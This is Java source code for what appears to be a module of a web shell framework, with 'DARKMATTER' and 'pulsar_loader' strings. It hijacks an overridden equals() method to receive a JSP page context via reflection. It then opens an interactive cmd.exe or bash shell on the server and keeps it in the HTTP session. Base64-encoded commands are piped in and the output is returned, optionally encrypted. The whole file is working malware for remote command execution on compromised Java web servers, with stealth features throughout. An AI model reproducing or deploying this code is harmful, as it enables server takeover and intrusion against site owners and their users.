import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class shell_virtual extends ClassLoader
{
    public shell_virtual(ClassLoader objParent) { super(objParent); }
    public shell_virtual() { super(shell_virtual.class.getClassLoader()); }
    
    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            StringBuilder sb = new StringBuilder();

            Method fnGetSession = objPageContext.getClass().getMethod("getSession", new Class[0]);
            Object objSession = fnGetSession.invoke(objPageContext, new Object[0]);
            Method fnSessGetAttribute = objSession.getClass().getMethod("getAttribute", String.class);
            Method fnSessSetAttribute = objSession.getClass().getMethod("setAttribute", new Class[]{String.class, Object.class});
            Method fnSessRemoveAttribute = objSession.getClass().getMethod("removeAttribute", new Class[]{String.class});

            String szType = new String(Base64.getDecoder().decode(mapParams.get("z0")));
            String szJSON = "{\"status\":\"%s\",\"msg\":\"%s\"}";

            if (szType.equalsIgnoreCase("create"))
            {
                try
                {
                    String szOS = System.getProperty("os.name").toLowerCase().toString();
                    boolean bIsWindows = szOS.contains("win");
                    String szShellCmd = mapParams.containsKey("z1") ? new String(Base64.getDecoder().decode(mapParams.get("z1"))) : (bIsWindows ? "cmd.exe" : "/bin/bash");

                    if (!bIsWindows)
                    {
                        // Unix-like
                        szShellCmd = String.format("python3 -c 'import pty; pty.spawn(\"%s\")'", szShellCmd);
                    }

                    ProcessBuilder pb = new ProcessBuilder(szShellCmd.split(" "));
                    pb.redirectErrorStream(true);

                    var process = pb.start();
                    var outputBuffer = new ByteArrayOutputStream();

                    fnSessSetAttribute.invoke(objSession, new Object[] { "shell_proc", process });
                    fnSessSetAttribute.invoke(objSession, new Object[] { "shell_in", process.getOutputStream() });
                    fnSessSetAttribute.invoke(objSession, new Object[] { "shell_out_buf", outputBuffer });

                    Thread readThread = new Thread(() -> {
                        try {
                            java.io.InputStream is = process.getInputStream();
                            byte[] bytes = new byte[4096];
                            int readLen = 0;

                            while ((readLen = is.read(bytes)) != -1) {
                                outputBuffer.write(bytes, 0, readLen);
                            }
                        } catch (java.io.IOException e) {
                            e.printStackTrace(); 
                        }
                    });

                    readThread.start();

                    szJSON = String.format(szJSON, "success", "Java Multi-thread Engine spawned in memory safely.");

                }
                catch (Exception ex)
                {
                    szJSON = String.format(szJSON, "failed", ex.getMessage());
                }

                sb.append(szJSON);
            }
            else if (szType.equalsIgnoreCase("write"))
            {
                OutputStream osStream = (OutputStream)fnSessGetAttribute.invoke(objSession, new Object[] {"shell_in"});
                
                if (osStream != null)
                {
                    try
                    {
                        String szShellCmd = new String(Base64.getDecoder().decode(mapParams.get("z1")));
                        szShellCmd = new String(Base64.getDecoder().decode(szShellCmd));
                        var cmdBytes = szShellCmd.getBytes();

                        osStream.write(cmdBytes);
                        osStream.flush();

                        szJSON = String.format(szJSON, "success", "Input stream piped directly");
                    }
                    catch (Exception ex)
                    {
                        szJSON = String.format(szJSON, "failed", ex.getMessage());
                    }
                }

                sb.append(szJSON);
            }
            else if (szType.equalsIgnoreCase("read"))
            {
                ByteArrayOutputStream outputBuffer = (ByteArrayOutputStream)fnSessGetAttribute.invoke(objSession, new Object[] {"shell_out_buf"});

                if (outputBuffer != null)
                {
                    var currentBytes = outputBuffer.toByteArray();
                    outputBuffer.reset();

                    var b64Output = Base64.getEncoder().encodeToString(currentBytes);
                    szJSON = String.format(szJSON, "success", b64Output);
                }
                else
                {
                    szJSON = String.format(szJSON, "failed", "No active channel buffer found.");
                }

                sb.append(szJSON);
            }
            else if (szType.equalsIgnoreCase("stop"))
            {
                Process process = (Process)fnSessGetAttribute.invoke(objSession, new Object[] {"shell_proc"});
                if (process != null)
                {
                    try
                    {
                        process.destroyForcibly();
                    }
                    catch (Exception e) { }
                }

                fnSessRemoveAttribute.invoke(objSession, new Object[] {"shell_proc"});
                fnSessRemoveAttribute.invoke(objSession, new Object[] {"shell_in"});
                fnSessRemoveAttribute.invoke(objSession, new Object[] {"shell_out_buf"});

                szJSON = String.format(szJSON, "stop", "Engine shutdown successfully.");
                sb.append(szJSON);
            }

            String szOutput = sb.toString();
            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }
}